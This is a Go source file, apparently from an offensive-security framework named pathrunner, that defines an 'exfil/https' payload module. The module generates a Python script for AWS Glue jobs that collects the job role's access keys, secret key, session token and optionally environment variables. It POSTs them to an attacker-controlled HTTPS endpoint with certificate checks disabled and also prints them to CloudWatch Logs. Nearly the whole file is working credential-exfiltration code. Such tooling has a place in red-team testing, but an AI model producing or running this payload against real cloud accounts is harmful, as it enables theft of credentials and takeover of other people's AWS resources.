// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package glue

import (
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// ExfilHTTPSPayload generates a Glue Python Shell script that extracts the
// Glue job's execution role credentials and POSTs them to an attacker-controlled
// HTTPS endpoint. Credentials are also printed to stdout using PATHFINDER_IDENTITY_DATA
// markers so they appear in CloudWatch Logs for auto-import.
type ExfilHTTPSPayload struct{}

func init() {
	payloads.Register(&ExfilHTTPSPayload{})
}

func (p *ExfilHTTPSPayload) GetName() string {
	return "exfil/https"
}

func (p *ExfilHTTPSPayload) GetDescription() string {
	return "Exfiltrate execution role credentials to an attacker-controlled HTTPS endpoint via Glue job"
}

func (p *ExfilHTTPSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueExfil,
		payloads.TagTransportHTTPS,
	}
}

func (p *ExfilHTTPSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "HTTPS_URL",
			Description: "Target HTTPS URL for credential exfiltration",
			Required:    true,
		},
		{
			Name:        "USER_AGENT",
			Description: "Custom User-Agent string for the HTTP request",
			Required:    false,
			Default:     "Mozilla/5.0 (compatible; AWS-Glue)",
		},
		{
			Name:        "TIMEOUT",
			Description: "HTTP request timeout in seconds",
			Required:    false,
			Default:     "10",
		},
		{
			Name:        "INCLUDE_ENV",
			Description: "Include Glue environment variables in the exfiltrated payload (true/false)",
			Required:    false,
			Default:     "false",
		},
	}
}

func (p *ExfilHTTPSPayload) Validate(options map[string]string) error {
	httpsURL := options["HTTPS_URL"]
	if httpsURL == "" {
		return fmt.Errorf("HTTPS_URL is required for exfil/https payload")
	}
	if !strings.HasPrefix(httpsURL, "http://") && !strings.HasPrefix(httpsURL, "https://") {
		return fmt.Errorf("HTTPS_URL must start with http:// or https://")
	}
	return nil
}

func (p *ExfilHTTPSPayload) GenerateCode(options map[string]string) (string, error) {
	httpsURL := options["HTTPS_URL"]
	userAgent := options["USER_AGENT"]
	if userAgent == "" {
		userAgent = "Mozilla/5.0 (compatible; AWS-Glue)"
	}
	timeout := options["TIMEOUT"]
	if timeout == "" {
		timeout = "10"
	}
	includeEnv := options["INCLUDE_ENV"] == "true"

	envCode := ""
	if includeEnv {
		envCode = `
    # Include environment variables
    env_vars = {k: v for k, v in sorted(os.environ.items())
                if k.startswith(('AWS_', 'GLUE_', 'SPARK_'))}
    payload['environment'] = env_vars
`
	}

	code := fmt.Sprintf(`import boto3
import json
import sys
import urllib.request
import urllib.error
import ssl

https_url = '%s'
user_agent = '%s'
timeout = %s

# Override from job arguments if provided
for i, arg in enumerate(sys.argv):
    if arg == '--HTTPS_URL' and i + 1 < len(sys.argv):
        https_url = sys.argv[i + 1]

# Get caller identity and credentials
sts = boto3.client('sts')
identity = sts.get_caller_identity()
session = boto3.Session()
credentials = session.get_credentials()

print(f"Caller ARN: {identity['Arn']}")
print(f"Account: {identity['Account']}")
print(f"Region: {session.region_name}")

payload = {
    'type': 'glue_credential_exfil',
    'caller_identity': {
        'account': identity['Account'],
        'arn': identity['Arn'],
        'user_id': identity['UserId']
    },
    'region': session.region_name
}

if credentials:
    creds = credentials.get_frozen_credentials()
    payload['credentials'] = {
        'access_key_id': creds.access_key,
        'secret_access_key': creds.secret_key,
        'session_token': creds.token
    }

    # Also print to CloudWatch for auto-import
    print(f"--- PATHFINDER_IDENTITY_DATA ---")
    print(f"NAME=glue-role/{identity['Arn'].split('/')[-1]}")
    print(f"TYPE=keys")
    print(f"ACCESS_KEY_ID={creds.access_key}")
    print(f"SECRET_ACCESS_KEY={creds.secret_key}")
    if creds.token:
        print(f"SESSION_TOKEN={creds.token}")
    print(f"REGION={session.region_name}")
    print(f"AUTO_SWITCH=false")
    print(f"--- END_PATHFINDER_IDENTITY_DATA ---")
%s
# Send to attacker endpoint (skip SSL verification for self-signed certs)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

body = json.dumps(payload).encode('utf-8')
req = urllib.request.Request(
    https_url,
    data=body,
    headers={
        'User-Agent': user_agent,
        'Content-Type': 'application/json',
        'X-Pathrunner': 'glue-exfil'
    },
    method='POST'
)

try:
    resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
    print(f"Exfiltration successful: HTTP {resp.status}")
except urllib.error.HTTPError as e:
    print(f"HTTP error: {e.code} {e.reason}")
except urllib.error.URLError as e:
    print(f"Connection error: {e.reason}")
except Exception as e:
    print(f"Exfiltration error: {e}")
`, httpsURL, userAgent, timeout, envCode)

	return code, nil
}

func (p *ExfilHTTPSPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
